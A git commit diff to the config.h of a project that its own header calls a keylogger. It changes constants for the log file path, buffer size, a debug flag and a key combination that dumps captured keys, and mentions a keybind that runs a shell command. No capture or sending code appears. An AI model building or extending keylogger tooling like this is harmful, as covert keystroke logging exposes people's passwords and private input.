feb05cb378e924dcc000749e6444a8e5778a2626
NewDawn0 <92283105+NewDawn0@users.noreply.github.com>
2023-03-19 22:45:32 +0100

    improved config

--- src/config.h
+++ src/config.h
@@ -8,10 +8,16 @@
  *  File: config.h
  *  Desc: Configuration for the keylogger
 */
+#include <stdbool.h>
 
-const char* OUT_FILE_PATH = "/var/log/logger.log";
-const int BUFSIZE = 20; // Sets the amount of character it needs until the log file is written to again;
+/*========= Configuration =========*/ 
+const char* LOG_FILE_PATH = "/var/log/logger.log";  // Where the log file is stored
+const int BUFSIZE = 20;                             // Amount of characters until the buffer of keys is logged to the file
+const bool DEBUG = true;                            // If debug messages shoudld be printed
 
-// Keybinds
-// force dump the collected chars to the log file
-const char* DUMP = "cmd + l"; // Sepereate the keys by +
+// Keybinds:
+// NOTE: do not seperate the keys with a space
+const char* DUMP = "cmd+ö";                        // Key combination which dumps all the keys
+                                                   // Key combination which executes shell command on keypress
+
+
